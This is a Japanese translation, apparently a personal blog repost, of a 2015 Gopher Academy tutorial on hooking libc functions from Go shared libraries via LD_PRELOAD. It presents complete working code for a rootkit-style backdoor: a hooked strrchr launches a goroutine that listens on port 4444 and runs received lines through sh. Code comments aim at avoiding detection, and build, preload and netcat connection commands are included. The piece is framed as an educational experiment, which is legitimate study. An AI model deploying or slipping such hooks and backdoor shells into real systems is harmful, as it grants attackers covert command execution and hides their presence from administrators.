<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>12月9日 - Hooking libc using Go shared libraries &middot; tbd</title>
  <meta name="description" content="2015年12月9日のGopherAcademyのAdvent Calendarの日本語訳。cgoを使ってルートキットをGoで書く">
  <meta name="format-detection" content="telephone=no">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="daikikohara" />
  <meta name="twitter:title" content="12月9日 - Hooking libc using Go shared libraries &middot; tbd">
  <meta name="twitter:description" content="2015年12月9日のGopherAcademyのAdvent Calendarの日本語訳。cgoを使ってルートキットをGoで書く">

  
  <meta property="og:type" content="article">
  <meta property="og:title" content="12月9日 - Hooking libc using Go shared libraries &middot; tbd">
  <meta property="og:description" content="2015年12月9日のGopherAcademyのAdvent Calendarの日本語訳。cgoを使ってルートキットをGoで書く">

  <link rel="icon" href="http://localhost:1313/favicon.ico" >
  <link rel="shortcut icon" href="http://localhost:1313/favicon.ico" >
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="http://localhost:1313//css/pure-min.css">
  
  
    <link rel="stylesheet" href="http://localhost:1313//css/grids-responsive-min.css">
  
  <link rel="stylesheet" href="http://localhost:1313//css/all.min.css">
</head>
<body>


<div id="container">
  <header class="header">
  <div class="header-content pure-g">
    <div class="header-content-left pure-u-1 pure-u-md-1-2">
      <a class="site-title" href="http://localhost:1313/">tbd</a>
      <span class="site-description"></span>
    </div>
    <div class="header-content-right pure-u-1 pure-u-md-1-2">
      <ul class="nav-list">
        <li class="nav-item">
          <a href="http://localhost:1313/about">About</a>
        </li>
        <li class="nav-item">
          <a href="http://localhost:1313/blog">Blog</a>
        </li>
        <li class="nav-item">
          <a href="http://localhost:1313/work">Work</a>
        </li>
      </ul>
    </div>
  </div>
</header>

  <div class="main">
    <div class="meta">
      <time class="time">31 Dec 2015, 15:09</time>
      <span class="category">
        
          categories:
          
          <a class="category-name category-name-golang" href="http://localhost:1313//categories/golang">golang</a>
        
      </span>
    </div>
    <section class="post">
      <header>
        <div class="title-single">12月9日 - Hooking libc using Go shared libraries</div>
        <div class="author">
          
          
            元記事の著者 - <strong class="author-name">Matt Bostock</strong>
          
        </div>
      </header>
      <div class="description">
        

<div class='note'>※本ポストは<a href="https://blog.gopheracademy.com/">Gopher Academy</a>の<a href="https://blog.gopheracademy.com/series/advent-2015/">Advent 2015</a>の<a href="https://blog.gopheracademy.com/advent-2015/libc-hooking-go-shared-libraries/">12月9日の記事</a>の日本語訳です。</div>

<p><a href="https://twitter.com/_ta0">Alastair O’Neill</a>が8月の<a href="http://www.bsidesmcr.org.uk/">BSides Manchester</a>セキュリティカンファレンスで<code>LD_PRELOAD</code>の仕組みを使ったユーザ空間の<a href="https://en.wikipedia.org/wiki/Rootkit">ルートキット</a>に関する発表を行った。このルートキットの多くはCで書かれている。
Go1.5では共有ライブラリ用のビルドモードをサポートすることが分かっていたため、この発表を聞いた際にGoで似たようなものを書けるのではないか、そしてその過程で<code>LD_PRELOAD</code>やcgo及びGoで共有ライブラリをビルドすることに関して何か学ぶことがあるのではないかと思った。</p>

<p>免責事項: 私はセキュリティ研究者ではないしここに載せるコードは単に学習目的の実験的なものである。</p>

<h2 id="ld-preload-ルートキットがどのように動作するか:8928758b80ccd8cb6a9a714a1b35fa0e"><code>LD_PRELOAD</code>ルートキットがどのように動作するか</h2>

<p><code>LD_PRELOAD</code>ルートキットは多くのUnixバイナリを<a href="https://en.wikipedia.org/wiki/Dynamic_linker">動的にリンク</a>する<a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a>ライブラリによって提供される機能の代わりとなるものを実装することによって動作する。
これらのhookを利用して関数の挙動を変更し、<a href="https://en.wikipedia.org/wiki/Pluggable_authentication_module">PAM</a>等の認証システムを回避することで、ルートキットは検知から逃れ、ルートキットによって設定された認証情報を使ってSSHログインできるバックドアを仕掛けるといったことを行う。</p>

<p>例えば<a href="https://github.com/chokepoint/azazel">Azazel</a>ルートキットは<a href="http://www.gnu.org/software/libc/manual/html_node/Opening-Streams.html">fopen</a>関数をhookし<a href="https://github.com/chokepoint/azazel/blob/16ca8ac6ed7280e0da73c0f7a166c84ea03ebaa7/azazel.c#L287-L300">ルートキットに関するネットワークアクティビティやファイルを隠蔽</a>する。
隠すものが無ければ<a href="https://github.com/chokepoint/azazel/blob/16ca8ac6ed7280e0da73c0f7a166c84ea03ebaa7/azazel.c#L299">元のlibc関数を呼び出し</a>、アプリケーションがユーザにとっては正常に動いているように見せかける。</p>

<p><code>LD_PRELOAD</code>を使って他のライブラリにhookすることは昔からある方法で、特にアプリケーションのソースコードにアクセスできない場合にアプリケーショのデバッグに<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">使われることがある</a>。</p>

<h2 id="goの中でのcの共有ライブラリ:8928758b80ccd8cb6a9a714a1b35fa0e">Goの中でのCの共有ライブラリ</h2>

<p>Go1.5は<code>-buildmode=c-shared</code>フラグをGoのツールに渡すことでGoのパッケージをCの共有ライブラリにビルドできる<a href="https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/edit?pli=1#heading=h.44n2lm20ate5">新しい実行モジュール</a>もしくはビルドモードを導入した。</p>

<p>つまりCの共有ライブラリにコンパイルされたGoのパッケージの関数をGo以外のプログラムが呼び出せるということだ。</p>

<p>共有ライブラリはGoのツールを使って以下のように作成できる。</p>

<pre><code>$ go build -buildmode=c-shared -o library_name.so main.go
$ file backdoor.so
backdoor.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=c554a198148f8b50e3c3a99024303f1d8a0cf066, not stripped
</code></pre>

<p><code>LD_PRELOAD</code>環境変数を使うことで、作成した<code>.so</code><a href="http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html">共有オブジェクトファイル</a>を動的にリンクすることができる。
例えば以下のように</p>

<pre><code>$ LD_PRELOAD=./library_name.so top
</code></pre>

<h2 id="cgo-cからgoまたはその逆の呼び出し:8928758b80ccd8cb6a9a714a1b35fa0e">cgo: CからGoまたはその逆の呼び出し</h2>

<p>cgoはGoのパッケージからCのコード呼び出しを可能にし、また、Goの関数をエクスポートしてCのコードからの呼び出しを可能にする。
より詳しい情報は<a href="http://blog.golang.org/c-go-cgo">このブログ記事</a>を参照。</p>

<p>CのプログラムからGoの関数が見えるようにするには<a href="https://golang.org/cmd/cgo/">cgo</a>コメントをGoの関数の直上に追加してエクスポートする必要がある。</p>

<pre><code class="language-go">//export FunctionName
func FunctionName() {...}
</code></pre>

<p><code>C</code>という擬似パッケージのインポートも必要。</p>

<pre><code>import &quot;C&quot;
</code></pre>

<h2 id="libc関数のオーバライド:8928758b80ccd8cb6a9a714a1b35fa0e">libc関数のオーバライド</h2>

<p>libc関数の挙動をオーバライドするには、Goの関数をエクスポートしてCのプログラムから見えるようにする。</p>

<pre><code class="language-go">//export strrchr
func strrchr(s *C.char, c C.int) *C.char {...}
</code></pre>

<p>元のlibcの関数と同じシグネチャを持つ必要があることに注意。
<code>C</code>擬似パッケージで提供される型を使っているのが分かるだろう。</p>

<p>関数の中身は元のlibc関数を再実装することもできるが、単に元のlibcの関数を呼び出すだけの方が簡単だろう。
元のlibcライブラリに動的リンクし、ラッパー関数から元の関数を呼び出すことでこれを行う。</p>

<p>GitHubに<code>dl</code>と呼ばれる<a href="[https://github.com/rainycape/dl">Goの動的ライブラリローダ</a>がある。
<code>dl.Open()</code>を使ってlibcライブラリを開くことができる。</p>

<pre><code class="language-go">lib, err := dl.Open(&quot;libc&quot;, 0)
if err != nil {
        log.Fatalln(err)
}
defer lib.Close()
</code></pre>

<p>そして<code>dl.Sym()</code>を使ってlibcからポインタにシンボル(今回の場合は関数)を読み込むことができる。
<code>strrchr</code>関数のシンボルを<code>old_strrchr</code>という名前のポインタに読み込む例は以下の通りである。</p>

<pre><code class="language-go">var old_strrchr func(s *C.char, c C.int) *C.char
lib.Sym(&quot;strrchr&quot;, &amp;old_strrchr)
</code></pre>

<p>次にラッパー関数の中で元の<code>sttrchr</code>関数を呼び出して戻り値を返す。
ラッパー関数全体は以下のようになる。</p>

<pre><code class="language-go">//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
        // Code to alter behaviour of original function
        // goes here

        lib, err := dl.Open(&quot;libc&quot;, 0)
        if err != nil {
                log.Fatalln(err)
        }
        defer lib.Close()

        var old_strrchr func(s *C.char, c C.int) *C.char
        lib.Sym(&quot;strrchr&quot;, &amp;old_strrchr)

        return old_strrchr(s, c)
}
</code></pre>

<h2 id="シンプルなリモートシェルをgoで書く:8928758b80ccd8cb6a9a714a1b35fa0e">シンプルなリモートシェルをGoで書く</h2>

<p>libc関数をhookする方法が分かった。
遊びとしてlibc関数が呼び出された時にポートにバインドして任意のコマンドを受け付けるシンプルなバックドアシェルサーバをGoで書いてみよう。</p>

<p>今回はHTTP, NNTP, SMTPのようなテキストベースのリクエスト/レスポンスプロトコルをサポートする<code>/net/textproto</code>パッケージを使ってみよう。</p>

<p>まずTCPポートを<code>net</code>パッケージの<code>net.Listen()</code>を使ってバインドしよう。</p>

<pre><code class="language-go">// Bind to localhost for our example so we don't inadvertently
// open ourselves up to an attack over the network
ln, err := net.Listen(&quot;tcp&quot;, &quot;localhost:4444&quot;)
if err != nil {
        return
}
</code></pre>

<p>これはコネクションを受け付ける<code>Listener</code>を提供する。</p>

<pre><code class="language-go">
for {
        conn, err := ln.Accept()
        if err != nil {
                // Don't log an error here otherwise we'd reveal the rootkit ;-)
                continue
        }

        go handleConnection(conn)
}
</code></pre>

<p>コネクションを受け付けるたびにgoroutineの中で<code>handleConnection()</code>を呼び出すことで複数のコネクションを並行に処理できるようにしている。</p>

<p><code>backdoor()</code>全体は以下のようになる。</p>

<pre><code class="language-go">func backdoor() {
        ln, err := net.Listen(&quot;tcp&quot;, &quot;localhost:4444&quot;)
        if err != nil {
                // Ignore errors to avoid detection
                return
        }

        for {
                conn, err := ln.Accept()
                if err != nil {
                        continue
                }

                go handleConnection(conn)
        }
}
</code></pre>

<p><code>handleConnection()</code>の中ではbuffered I/Oリーダを作り、<code>bufio.NewReader()</code>を使ってコネクションから読み込む。
そしてbuffred I/Oリーダを<code>textproto.NewReader()</code>に渡す。これはテキストベースのプロトコルのコネクションからの読み込み用に<code>textproto.ReadLine()</code>等の便利な関数を提供するものだ。</p>

<pre><code class="language-go">reader := bufio.NewReader(conn)
tp := textproto.NewReader(reader)
</code></pre>

<p>そしてコネクションから読み込んだ行を<code>sh</code>(多くの場合はbash)に渡し、実行結果をコネクションに返す。</p>

<p><code>handleConnection()</code>全体は以下のようになる。</p>

<pre><code class="language-go">
func handleConnection(conn net.Conn) {
        reader := bufio.NewReader(conn)
        tp := textproto.NewReader(reader)

        for {
                input, err := tp.ReadLine()
                if err != nil {
                        log.Println(&quot;Error reading:&quot;, err.Error())
                        break
                }

                cmd := exec.Command(&quot;/usr/bin/env&quot;, &quot;sh&quot;, &quot;-c&quot;, input)
                output, err := cmd.CombinedOutput()
                if err != nil {
                        conn.Write([]byte(err.Error() + &quot;\n&quot;))
                }

                conn.Write(output)
        }

        conn.Close()
}
</code></pre>

<h2 id="libc関数が呼ばれた時にリモートシェルを開始する:8928758b80ccd8cb6a9a714a1b35fa0e">libc関数が呼ばれた時にリモートシェルを開始する</h2>

<p>対象のアプリケーションがlibc関数を呼びだそうとするたびにリモートシェルを開始してみよう。</p>

<p>リモートシェルサーバはgoroutineの中で開始するので、元のlibcの関数が呼ばれている間はバックグラウンドで動作し続けることができる。</p>

<p>シンプルなシグネチャでcgoで実装しやすいので、今回は先に使った<code>strrchr()</code>libc関数をhookする。
ルートキットなら<code>fopen()</code>や<code>stat()</code>にhookするだろうが、今回は<code>strrchr()</code>で十分である。</p>

<pre><code class="language-go">//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
        // Start remote shell
        go backdoor()

        lib, err := dl.Open(&quot;libc&quot;, 0)
        if err != nil {
                log.Fatalln(err)
        }
        defer lib.Close()

        var old_strrchr func(s *C.char, c C.int) *C.char
        lib.Sym(&quot;strrchr&quot;, &amp;old_strrchr)

        // Call original libc functional and return its return value
        return old_strrchr(s, c)
}
</code></pre>

<h2 id="テストしてみよう:8928758b80ccd8cb6a9a714a1b35fa0e">テストしてみよう</h2>

<p>Cの共有ライブラリにコンパイルするには、<code>-buildmode</code>フラグ付きで<code>go build</code>する。</p>

<pre><code>$ go build -buildmode=c-shared -o backdoor.so main.go
</code></pre>

<p><code>LD_PRELOAD</code>環境変数をセットして共有ライブラリを使い、Linuxの<code>top</code>コマンドを使ったら、リモートシェルに<code>netcat</code>や<code>telnet</code>などを使って接続できる。</p>

<pre><code>$ LD_PRELOAD=./backdoor.so top
</code></pre>

<pre><code># In another terminal
$ nc localhost 4444
[...type your commands here...]
</code></pre>

<p>topのプロセスが生きている限りはコマンドを送ることができるだろう。</p>

<h2 id="結論:8928758b80ccd8cb6a9a714a1b35fa0e">結論</h2>

<p>ここで紹介したコードは実験的なものではあるが、テキストベースプロトコルを使ってGoでサーバを書くのがいかに簡単か、及び、Cのアプリケーションからgoroutineを開始するなどのGoの共有ライブラリの能力を紹介した。</p>

<p>完全な<a href="https://github.com/mattbostock/go-ldpreload-backdoor">コード例</a>はGitHubに置いてある。</p>

      </div>
      
      <div class="share">
        <h4>Share</h4>
        
        <a href="#" data-type="twitter" data-url="http://localhost:1313/gopheracademy-advent-2015-ja/9-libc-hooking-go-shared-libraries-ja/" data-description="2015年12月9日のGopherAcademyのAdvent Calendarの日本語訳。cgoを使ってルートキットをGoで書く" data-via="daikikohara" class="prettySocial fa fa-twitter"></a>
        
        <a href="#" data-type="facebook" data-url="http://localhost:1313/gopheracademy-advent-2015-ja/9-libc-hooking-go-shared-libraries-ja/" data-title="12月9日 - Hooking libc using Go shared libraries" data-description="2015年12月9日のGopherAcademyのAdvent Calendarの日本語訳。cgoを使ってルートキットをGoで書く" data-media="" class="prettySocial fa fa-facebook"></a>
        <a href="#" data-type="googleplus" data-url="http://localhost:1313/gopheracademy-advent-2015-ja/9-libc-hooking-go-shared-libraries-ja/" data-description="2015年12月9日のGopherAcademyのAdvent Calendarの日本語訳。cgoを使ってルートキットをGoで書く" class="prettySocial fa fa-google-plus"></a>
        <a href="http://b.hatena.ne.jp/entry/http://localhost:1313/gopheracademy-advent-2015-ja/9-libc-hooking-go-shared-libraries-ja/" class="hatena-bookmark-button fa fa-hatena" data-hatena-bookmark-title="12月9日 - Hooking libc using Go shared libraries" data-hatena-bookmark-layout="simple" title="このエントリーをはてなブックマークに追加"></a>
      </div>
      
      
    </section>
  </div>
  <footer class="footer-single pure-g">
  <hr>
  <div class="pure-u-1 pure-u-md-1-2 footer-single-left">
    <a rel="license" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
      <img alt="Creative Commons License" style="border-width:0" src="http://localhost:1313/images/cc.png" />
    </a>
    Except where otherwise noted, content on this site is licensed under a <a rel="license" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a>.
  </div>
  <div class="pure-u-1 pure-u-md-1-2 footer-single-right">
    &#169; 2015 Daiki Kohara<br>
    Powered by <a href="https://gohugo.io/" target="_blank">hugo</a>
  </div>
</footer>
<script src="http://localhost:1313//js/all.min.js"></script>
<script type="text/javascript" src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script>
<script>hljs.initHighlightingOnLoad();</script>

</div>


<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', '', 'auto');
ga('send', 'pageview');

</script>


<script data-no-instant>document.write('<script src="http://'
        + (location.host || 'localhost').split(':')[0]
		+ ':1313/livereload.js?mindelay=10"></'
        + 'script>')</script></body>
</html>
